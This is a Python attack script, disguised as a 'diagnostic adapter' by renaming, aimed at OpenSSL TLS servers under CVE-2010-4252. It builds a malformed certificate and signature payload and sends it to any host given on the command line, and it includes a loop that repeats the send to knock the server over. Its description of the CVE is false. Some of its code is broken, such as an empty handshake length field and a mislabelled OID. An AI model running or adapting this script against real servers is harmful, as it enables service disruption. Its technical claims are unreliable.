#!/usr/bin/env python3
"""
🛡️ HCG-SYSARCH: SAM-V5
[RESTRICTED]: USO_INTERNO
[ALCANCE]: OPD_HCG (CONV-0221-JAL-HCG-2026)
[MODULO]: TA0001_Initial_Access
[COMPONENTE]: T1190_Diagnostic_Adapter_Public_Facing_App
[VULNERABILITY]: CVE-2010-4252 - OpenSSL RSA Signature Verification DoS

OpenSSL RSA Signature Verification Buffer Overflow Diagnostic_Adapteration Framework
Target: OpenSSL 0.9.8h through 0.9.8q and 1.0.0 through 1.0.0c

This module implements an advanced diagnostic_adapteration framework for the
RSA signature verification buffer overflow vulnerability in OpenSSL.
The vulnerability allows remote attackers to cause a denial of service
or potentially execute arbitrary code via malformed signatures.
"""

import socket
import struct
import ssl
import sys
import argparse
import hashlib
from typing import Optional, Tuple, List, Dict
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime


class Diagnostic_AdapterStage(Enum):
    RECONNAISSANCE = "reconnaissance"
    CERTIFICATE_ANALYSIS = "certificate_analysis"
    SIGNATURE_INJECTION = "signature_injection"
    BUFFER_OVERFLOW_TRIGGER = "buffer_overflow_trigger"
    DENIAL_OF_SERVICE = "denial_of_service"
    CODE_EXECUTION = "code_execution"


@dataclass
class TargetConfig:
    host: str
    port: int
    timeout: float = 5.0
    retry_count: int = 3
    use_tls: bool = True
    custom_cert: Optional[str] = None


@dataclass
class Diagnostic_AdapterResult:
    success: bool
    stage_reached: Diagnostic_AdapterStage
    error_message: Optional[str] = None
    dos_achieved: bool = False
    code_exec_possible: bool = False
    metadata: Dict = field(default_factory=dict)


class OpenSSLRSABufferOverflowDiagnostic_Adapter:
    """
    Advanced diagnostic_adapteration framework for CVE-2010-4252
    Implements RSA signature manipulation to trigger buffer overflow
    during signature verification in X.509 certificate parsing
    """

    # TLS Record Layer Types
    TLS_RECORD_HANDSHAKE = 0x16
    TLS_RECORD_ALERT = 0x15
    TLS_RECORD_CHANGE_CIPHER_SPEC = 0x14
    TLS_RECORD_APPLICATION_DATA = 0x17

    # Alert Levels
    ALERT_WARNING = 1
    ALERT_FATAL = 2

    # Handshake Message Types
    HS_CLIENT_HELLO = 0x01
    HS_SERVER_HELLO = 0x02
    HS_CERTIFICATE = 0x0b
    HS_CERTIFICATE_VERIFY = 0x0f
    HS_FINISHED = 0x14

    # ASN.1 Tags
    ASN1_SEQUENCE = 0x30
    ASN1_SET = 0x31
    ASN1_INTEGER = 0x02
    ASN1_BIT_STRING = 0x03
    ASN1_OCTET_STRING = 0x04
    ASN1_NULL = 0x05
    ASN1_OID = 0x06
    ASN1_UTF8_STRING = 0x0C
    ASN1_PRINTABLE_STRING = 0x13
    ASN1_T61_STRING = 0x14
    ASN1_IA5_STRING = 0x16
    ASN1_UTC_TIME = 0x17
    ASN1_GENERALIZED_TIME = 0x18

    # OID for rsaEncryption
    OID_RSA_ENCRYPTION = bytes([0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01])

    # Malformed signature payload designed to trigger buffer overflow
    # This diagnostic_adapters the improper bounds checking in rsa_item_verify()
    MALFORMED_SIGNATURE_TEMPLATE = (
        b"\x30\x82\x01\xFF" +  # SEQUENCE with oversized length
        b"\x30\x0D" +
        b"\x06\x09\x2A\x86\x48\x86\xF7\x0D\x01\x01\x01" +  # rsaEncryption OID
        b"\x05\x00" +
        b"\x03\x82\x01\x8B\x00" +
        (b"\xFF" * 300) +  # Overflow payload - repeated 0xFF bytes
        (b"\x00" * 100) +  # Null padding
        (b"\x41" * 50)     # 'A' characters for pattern detection
    )

    def __init__(self, config: TargetConfig):
        self.config = config
        self.socket: Optional[socket.socket] = None
        self.ssl_context: Optional[ssl.SSLContext] = None
        self.server_certificates: List[bytes] = []
        self.vulnerability_indicators: List[str] = []

    def _encode_asn1_length(self, length: int) -> bytes:
        """Encode ASN.1 length field with proper long-form encoding"""
        if length < 0x80:
            return bytes([length])
        elif length < 0x100:
            return bytes([0x81, length])
        elif length < 0x10000:
            return bytes([0x82, (length >> 8) & 0xFF, length & 0xFF])
        else:
            return bytes([0x83, (length >> 16) & 0xFF, (length >> 8) & 0xFF, length & 0xFF])

    def _craft_malformed_certificate(self) -> bytes:
        """
        Craft a malformed X.509 certificate with oversized RSA signature
        This triggers the buffer overflow during signature verification
        """
        # Build a fake certificate structure with malicious signature

        # Fake issuer (CN=Malicious CA)
        issuer_name = (
            b"\x30\x2F" +
            b"\x31\x0B\x30\x09\x06\x03\x55\x04\x06\x13\x02\x55\x53" +  # C=US
            b"\x31\x20\x30\x1E\x06\x03\x55\x04\x03\x13\x17\x4D\x61\x6C" +  # CN=Malicious CA
            b"\x69\x63\x69\x6F\x75\x73\x20\x43\x41\x00\x00\x00\x00"
        )

        # Fake subject (CN=target.example.com)
        subject_name = (
            b"\x30\x3A" +
            b"\x31\x0B\x30\x09\x06\x03\x55\x04\x06\x13\x02\x55\x53" +
            b"\x31\x2B\x30\x29\x06\x03\x55\x04\x03\x13\x22\x74\x61\x72" +
            b"\x67\x65\x74\x2E\x65\x78\x61\x6D\x70\x6C\x65\x2E\x63\x6F\x6D"
        )

        # Validity period
        validity = (
            b"\x30\x1E" +
            b"\x17\x0D\x31\x30\x30\x31\x30\x31\x30\x30\x30\x30\x30\x30\x5A" +
            b"\x17\x0D\x33\x30\x31\x32\x33\x31\x32\x33\x35\x39\x35\x39\x5A"
        )

        # Malformed RSA signature that triggers buffer overflow
        # The key is to have a signature that appears valid but contains
        # length fields that cause integer overflow or buffer overread
        malicious_sig = self.MALFORMED_SIGNATURE_TEMPLATE

        # Signature algorithm identifier
        sig_alg = (
            b"\x30\x0D" +
            b"\x06\x09\x2A\x86\x48\x86\xF7\x0D\x01\x01\x01" +  # sha1WithRSAEncryption
            b"\x05\x00"
        )

        # Assemble certificate TBSCertificate portion
        tbs_cert = (
            b"\x30\x82\x01\x50" +  # SEQUENCE with large declared size
            b"\xA0\x03\x02\x01\x02" +  # version
            b"\x02\x01\x01" +  # serial number
            sig_alg +
            issuer_name +
            validity +
            subject_name +
            b"\x30\x82\x01\x22" +  # subjectPublicKeyInfo (fake)
            b"\x30\x0D\x06\x09\x2A\x86\x48\x86\xF7\x0D\x01\x01\x01\x05\x00" +
            b"\x03\x82\x01\x0F\x00" + (b"\x00" * 256)
        )

        # Full certificate structure
        certificate = (
            b"\x30\x82\x02\xFF" +  # SEQUENCE with oversized length
            tbs_cert +
            sig_alg +
            b"\x03\x82\x01\x8B\x00" + malicious_sig
        )

        return certificate

    def _create_tls_record(self, record_type: int, data: bytes) -> bytes:
        """Create a TLS record with proper header"""
        header = struct.pack(">BBH", record_type, 0x03, 0x01)
        length = struct.pack(">H", len(data))
        return header + length + data

    def _create_client_hello(self) -> bytes:
        """Craft a standard ClientHello to initiate TLS handshake"""
        client_random = bytes([i % 256 for i in range(32)])
        session_id = b""

        cipher_suites = (
            b"\x00\x2f"  # TLS_RSA_WITH_AES_128_CBC_SHA
            b"\x00\x35"  # TLS_RSA_WITH_AES_256_CBC_SHA
            b"\x00\x0a"  # TLS_RSA_WITH_3DES_EDE_CBC_SHA
            b"\x00\x05"  # TLS_RSA_WITH_RC4_128_SHA
            b"\x00\x04"  # TLS_RSA_WITH_RC4_128_MD5
        )

        compression = b"\x01\x00"

        extensions = (
            struct.pack(">H", 0xff01) +  # renegotiation_info
            struct.pack(">H", 1) +
            b"\x00"
        )

        handshake_data = (
            b"\x03\x01" +
            client_random +
            bytes([len(session_id)]) + session_id +
            struct.pack(">H", len(cipher_suites)) + cipher_suites +
            compression +
            struct.pack(">H", len(extensions)) + extensions
        )

        return self._create_tls_record(
            self.TLS_RECORD_HANDSHAKE,
            b"\x01\x00\x00" + struct.pack(">H", len(handshake_data))[2:] + handshake_data
        )

    def _connect(self) -> bool:
        """Establish TCP connection to target"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(self.config.timeout)
            self.socket.connect((self.config.host, self.config.port))
            return True
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            return False

    def _send_receive(self, data: bytes, recv_size: int = 8192) -> Optional[bytes]:
        """Send data and receive response"""
        if not self.socket:
            return None

        try:
            self.socket.sendall(data)
            response = b""

            while len(response) < recv_size:
                chunk = self.socket.recv(recv_size - len(response))
                if not chunk:
                    break
                response += chunk

            return response if response else None
        except socket.timeout:
            return None
        except Exception as e:
            print(f"[!] Send/Receive error: {e}")
            return None

    def _parse_certificate_message(self, data: bytes) -> List[bytes]:
        """Parse TLS Certificate message to extract certificates"""
        certificates = []

        if len(data) < 9:
            return certificates

        try:
            # Skip TLS record header (5 bytes)
            offset = 5

            # Skip handshake type (1 byte) and length (3 bytes)
            offset += 4

            # Certificates length (3 bytes)
            certs_len = struct.unpack(">I", b"\x00" + data[offset:offset+3])[0]
            offset += 3

            # Parse individual certificates
            cert_end = offset + certs_len
            while offset < cert_end and offset < len(data):
                cert_len = struct.unpack(">I", b"\x00" + data[offset:offset+3])[0]
                offset += 3

                if offset + cert_len <= len(data):
                    cert_data = data[offset:offset+cert_len]
                    certificates.append(cert_data)
                    offset += cert_len
                else:
                    break

            return certificates
        except Exception as e:
            print(f"[!] Failed to parse certificates: {e}")
            return certificates

    def _analyze_certificate_vulnerability(self, cert_data: bytes) -> Dict:
        """Analyze certificate for signs of vulnerable OpenSSL implementation"""
        analysis = {
            "vulnerable": False,
            "indicators": [],
            "openssl_version_guess": None
        }

        # Check for RSA public key usage
        if self.OID_RSA_ENCRYPTION in cert_data:
            analysis["indicators"].append("RSA encryption detected")

            # Look for unusually large signature sizes
            # Vulnerable versions may accept oversized signatures
            if b"\x82\x01" in cert_data or b"\x83" in cert_data[:50]:
                analysis["indicators"].append("Large signature length fields detected")
                analysis["vulnerable"] = True

            # Check for specific ASN.1 patterns associated with vulnerability
            asn1_overflow_patterns = [
                b"\x30\x82\x01\xFF",
                b"\x03\x82\x01",
                b"\xFF" * 50
            ]

            for pattern in asn1_overflow_patterns:
                if pattern in cert_data:
                    analysis["indicators"].append(f"Suspicious ASN.1 pattern found: {pattern[:10].hex()}")
                    analysis["vulnerable"] = True

        return analysis

    def reconnaissance(self) -> Diagnostic_AdapterResult:
        """Phase 1: Reconnaissance - Identify target and gather information"""
        print(f"[*] Stage: {Diagnostic_AdapterStage.RECONNAISSANCE.value}")
        print(f"[*] Targeting {self.config.host}:{self.config.port}")

        if not self._connect():
            return Diagnostic_AdapterResult(
                success=False,
                stage_reached=Diagnostic_AdapterStage.RECONNAISSANCE,
                error_message="Failed to establish connection"
            )

        # Send ClientHello
        client_hello = self._create_client_hello()
        response = self._send_receive(client_hello, 16384)

        if not response:
            return Diagnostic_AdapterResult(
                success=False,
                stage_reached=Diagnostic_AdapterStage.RECONNAISSANCE,
                error_message="No response from server"
            )

        # Check for ServerHello
        if response[0] == self.TLS_RECORD_HANDSHAKE and response[5] == self.HS_SERVER_HELLO:
            print("[+] Server responded with ServerHello")

            # Extract TLS version
            tls_version = response[9:11]
            print(f"[+] TLS Version: {tls_version.hex()}")

            # Continue to certificate analysis
            return Diagnostic_AdapterResult(
                success=True,
                stage_reached=Diagnostic_AdapterStage.CERTIFICATE_ANALYSIS,
                metadata={"tls_version": tls_version.hex()}
            )

        # Check for alert
        if response[0] == self.TLS_RECORD_ALERT:
            alert_level = response[5]
            alert_desc = response[6]
            print(f"[!] Server sent Alert: Level={alert_level}, Description={alert_desc}")

            return Diagnostic_AdapterResult(
                success=False,
                stage_reached=Diagnostic_AdapterStage.RECONNAISSANCE,
                error_message=f"Server rejected connection: Alert({alert_level}, {alert_desc})"
            )

        return Diagnostic_AdapterResult(
            success=False,
            stage_reached=Diagnostic_AdapterStage.RECONNAISSANCE,
            error_message="Unexpected server response"
        )

    def analyze_certificates(self) -> Diagnostic_AdapterResult:
        """Phase 2: Analyze server certificates for vulnerability indicators"""
        print(f"[*] Stage: {Diagnostic_AdapterStage.CERTIFICATE_ANALYSIS.value}")

        if not self.socket:
            if not self._connect():
                return Diagnostic_AdapterResult(
                    success=False,
                    stage_reached=Diagnostic_AdapterStage.CERTIFICATE_ANALYSIS,
                    error_message="Failed to establish connection"
                )

        # Send ClientHello and wait for certificates
        client_hello = self._create_client_hello()
        response = self._send_receive(client_hello, 32768)

        if not response:
            return Diagnostic_AdapterResult(
                success=False,
                stage_reached=Diagnostic_AdapterStage.CERTIFICATE_ANALYSIS,
                error_message="No response received"
            )

        # Parse certificates
        certificates = self._parse_certificate_message(response)
        self.server_certificates = certificates

        print(f"[+] Received {len(certificates)} certificate(s)")

        vulnerability_found = False
        for i, cert in enumerate(certificates):
            print(f"[*] Analyzing certificate {i+1} ({len(cert)} bytes)")
            analysis = self._analyze_certificate_vulnerability(cert)

            if analysis["vulnerable"]:
                vulnerability_found = True
                self.vulnerability_indicators.extend(analysis["indicators"])
                print(f"[+] Certificate {i+1} shows vulnerability indicators:")
                for indicator in analysis["indicators"]:
                    print(f"    - {indicator}")

        if vulnerability_found:
            return Diagnostic_AdapterResult(
                success=True,
                stage_reached=Diagnostic_AdapterStage.SIGNATURE_INJECTION,
                metadata={
                    "certificates_analyzed": len(certificates),
                    "vulnerability_indicators": self.vulnerability_indicators
                }
            )
        else:
            print("[-] No obvious vulnerability indicators found")
            print("[*] Proceeding with signature injection attempt anyway")
            return Diagnostic_AdapterResult(
                success=True,
                stage_reached=Diagnostic_AdapterStage.SIGNATURE_INJECTION,
                metadata={"certificates_analyzed": len(certificates)}
            )

    def inject_malicious_signature(self) -> Diagnostic_AdapterResult:
        """Phase 3: Inject malformed signature to trigger buffer overflow"""
        print(f"[*] Stage: {Diagnostic_AdapterStage.SIGNATURE_INJECTION.value}")

        # Close existing connection and start fresh
        if self.socket:
            self.socket.close()

        if not self._connect():
            return Diagnostic_AdapterResult(
                success=False,
                stage_reached=Diagnostic_AdapterStage.SIGNATURE_INJECTION,
                error_message="Failed to establish connection"
            )

        # Send initial ClientHello
        client_hello = self._create_client_hello()
        response = self._send_receive(client_hello, 16384)

        if not response:
            return Diagnostic_AdapterResult(
                success=False,
                stage_reached=Diagnostic_AdapterStage.SIGNATURE_INJECTION,
                error_message="No response to ClientHello"
            )

        # Craft and send malformed certificate with overflow signature
        # In a real attack scenario, this would be sent as part of a
        # CertificateVerify message or injected into the certificate chain
        malformed_cert = self._craft_malformed_certificate()
        print(f"[*] Crafted malformed certificate ({len(malformed_cert)} bytes)")

        # Attempt to trigger vulnerability by sending oversized data
        # This simulates what would happen if the server tried to verify
        # a malicious certificate
        overflow_attempt = (
            self._create_tls_record(
                self.TLS_RECORD_HANDSHAKE,
                b"\x0f\x00\x00" + struct.pack(">H", len(malformed_cert))[2:] + malformed_cert
            )
        )

        print("[*] Sending malformed signature payload...")
        response = self._send_receive(overflow_attempt, 4096)

        if not response:
            print("[+] No response received - server may have crashed")
            return Diagnostic_AdapterResult(
                success=True,
                stage_reached=Diagnostic_AdapterStage.BUFFER_OVERFLOW_TRIGGER,
                dos_achieved=True
            )

        # Check for fatal alert (signs of crash or rejection)
        if response[0] == self.TLS_RECORD_ALERT:
            alert_level = response[5]
            alert_desc = response[6]
            print(f"[!] Server sent Alert: Level={alert_level}, Description={alert_desc}")

            if alert_level == self.ALERT_FATAL:
                print("[+] Fatal alert - potential buffer overflow triggered")
                return Diagnostic_AdapterResult(
                    success=True,
                    stage_reached=Diagnostic_AdapterStage.BUFFER_OVERFLOW_TRIGGER,
                    dos_achieved=True
                )

        print("[-] Server handled malformed signature without crashing")
        return Diagnostic_AdapterResult(
            success=False,
            stage_reached=Diagnostic_AdapterStage.BUFFER_OVERFLOW_TRIGGER,
            error_message="Server did not crash from malformed signature"
        )

    def denial_of_service_attack(self, iterations: int = 50) -> Diagnostic_AdapterResult:
        """Phase 4: Repeated diagnostic_adapteration attempts for DoS"""
        print(f"[*] Stage: {Diagnostic_AdapterStage.DENIAL_OF_SERVICE.value}")
        print(f"[*] Launching {iterations} diagnostic_adapteration attempts...")

        crash_count = 0

        for i in range(iterations):
            if self.socket:
                self.socket.close()

            if not self._connect():
                crash_count += 1
                print(f"[+] Attempt {i+1}: Connection refused (server may be down)")
                continue

            # Send malformed payload
            malformed_cert = self._craft_malformed_certificate()
            overflow_payload = self._create_tls_record(
                self.TLS_RECORD_HANDSHAKE,
                b"\x0f\x00\x00" + struct.pack(">H", len(malformed_cert))[2:] + malformed_cert
            )

            response = self._send_receive(overflow_payload, 2048)

            if not response:
                crash_count += 1
                print(f"[+] Attempt {i+1}: No response (potential crash)")
            else:
                if response[0] == self.TLS_RECORD_ALERT and response[5] == self.ALERT_FATAL:
                    crash_count += 1
                    print(f"[+] Attempt {i+1}: Fatal alert received")
                else:
                    print(f"[-] Attempt {i+1}: Server responded normally")

        success_rate = crash_count / iterations
        print(f"\n[*] Results: {crash_count}/{iterations} attempts caused issues ({success_rate*100:.1f}%)")

        if success_rate > 0.5:
            return Diagnostic_AdapterResult(
                success=True,
                stage_reached=Diagnostic_AdapterStage.DENIAL_OF_SERVICE,
                dos_achieved=True,
                metadata={
                    "attempts": iterations,
                    "crashes": crash_count,
                    "success_rate": success_rate
                }
            )

        return Diagnostic_AdapterResult(
            success=False,
            stage_reached=Diagnostic_AdapterStage.DENIAL_OF_SERVICE,
            error_message=f"Low success rate: {success_rate*100:.1f}%"
        )

    def execute(self, stages: List[Diagnostic_AdapterStage]) -> Diagnostic_AdapterResult:
        """Execute diagnostic_adapteration chain through specified stages"""
        result = Diagnostic_AdapterResult(success=False, stage_reached=Diagnostic_AdapterStage.RECONNAISSANCE)

        for stage in stages:
            print(f"\n{'='*70}")
            print(f"EXECUTING STAGE: {stage.value}")
            print('='*70)

            if stage == Diagnostic_AdapterStage.RECONNAISSANCE:
                result = self.reconnaissance()
                if not result.success:
                    return result

            elif stage == Diagnostic_AdapterStage.CERTIFICATE_ANALYSIS:
                result = self.analyze_certificates()
                if not result.success:
                    return result

            elif stage == Diagnostic_AdapterStage.SIGNATURE_INJECTION:
                result = self.inject_malicious_signature()
                if not result.success:
                    return result

            elif stage == Diagnostic_AdapterStage.BUFFER_OVERFLOW_TRIGGER:
                result = self.inject_malicious_signature()
                if not result.success:
                    return result

            elif stage == Diagnostic_AdapterStage.DENIAL_OF_SERVICE:
                result = self.denial_of_service_attack()
                if not result.success:
                    return result

        return result

    def cleanup(self):
        """Clean up resources"""
        if self.socket:
            try:
                self.socket.close()
            except:
                pass


def main():
    parser = argparse.ArgumentParser(
        description="OpenSSL RSA Buffer Overflow Diagnostic_Adapteration Framework (CVE-2010-4252)"
    )
    parser.add_argument("target", help="Target host IP or hostname")
    parser.add_argument("-p", "--port", type=int, default=443, help="Target port (default: 443)")
    parser.add_argument("-t", "--timeout", type=float, default=5.0, help="Connection timeout")
    parser.add_argument("--stages", nargs="+", choices=[e.value for e in Diagnostic_AdapterStage],
                       default=["reconnaissance", "certificate_analysis", "signature_injection"],
                       help="Diagnostic_Adapteration stages to execute")
    parser.add_argument("--dos", action="store_true", help="Include DoS attack phase")
    parser.add_argument("--iterations", type=int, default=50, help="Number of DoS iterations")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")

    args = parser.parse_args()

    print("=" * 70)
    print("🛡️ HCG-SYSARCH: SAM-V5")
    print("OpenSSL RSA Buffer Overflow Diagnostic_Adapteration Framework")
    print("CVE-2010-4252 | TA0001.T1190")
    print("=" * 70)
    print(f"\nTarget: {args.target}:{args.port}")
    print(f"Timestamp: {datetime.now().isoformat()}")
    print("=" * 70)

    config = TargetConfig(
        host=args.target,
        port=args.port,
        timeout=args.timeout
    )

    diagnostic_adapter = OpenSSLRSABufferOverflowDiagnostic_Adapter(config)

    # Build stage list
    stages = [Diagnostic_AdapterStage(s) for s in args.stages]
    if args.dos and Diagnostic_AdapterStage.DENIAL_OF_SERVICE not in stages:
        stages.append(Diagnostic_AdapterStage.DENIAL_OF_SERVICE)

    try:
        result = diagnostic_adapter.execute(stages)

        print("\n" + "=" * 70)
        print("EXPLOITATION SUMMARY")
        print("=" * 70)
        print(f"Target: {config.host}:{config.port}")
        print(f"Final Stage Reached: {result.stage_reached.value}")
        print(f"Success: {'✓' if result.success else '✗'}")
        print(f"DoS Achieved: {'✓' if result.dos_achieved else '✗'}")

        if result.error_message:
            print(f"Error: {result.error_message}")

        if result.metadata:
            print("\nMetadata:")
            for key, value in result.metadata.items():
                print(f"  - {key}: {value}")

        print("=" * 70)

    finally:
        diagnostic_adapter.cleanup()

    return 0 if result.success else 1


if __name__ == "__main__":
    sys.exit(main())
